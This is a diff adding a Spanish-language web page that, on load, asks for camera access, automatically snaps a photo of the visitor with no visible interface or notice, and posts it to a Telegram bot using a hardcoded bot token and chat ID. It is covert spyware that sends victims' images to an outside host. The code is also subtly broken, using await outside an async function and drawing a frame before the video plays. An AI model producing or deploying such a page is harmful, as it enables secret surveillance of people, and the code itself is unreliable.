@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Tomar foto y enviar a Telegram</title>
+  <style>
+    /* Estilos para la página web */
+    body {
+      background-color: #ffffff;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    // Variable para almacenar la cámara
+    let camara;
+    
+    // Función para solicitar permiso y obtener la cámara
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        camara = stream;
+        // Tomar la foto automáticamente
+        tomarFoto();
+      })
+      .catch((error) => {
+        console.error('Error al obtener la cámara:', error);
+      });
+    
+    // Función para tomar la foto y enviarla al bot de Telegram
+    function tomarFoto() {
+      try {
+        // Crear un canvas para tomar la foto
+        const canvas = document.createElement('canvas');
+        canvas.width = 400;
+        canvas.height = 300;
+        const ctx = canvas.getContext('2d');
+        
+        // Tomar la foto
+        const video = document.createElement('video');
+        video.srcObject = camara;
+        video.play();
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const foto = canvas.toDataURL();
+        
+        // Enviar la foto al bot de Telegram
+        const respuesta = await fetch('https://api.telegram.org/bot7607328815:AAEGMJquz5YvKOaIkLKB10nh12MmfCYXJ0U/sendPhoto', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: '7267478032',
+            photo: foto
+          })
+        });
+        
+        // Mostrar mensaje de confirmación
+        console.log('Foto enviada correctamente!');
+      } catch (error) {
+        console.error('Error al enviar la foto:', error);
+      }
+    }
+  </script>
+</body>
+</html>
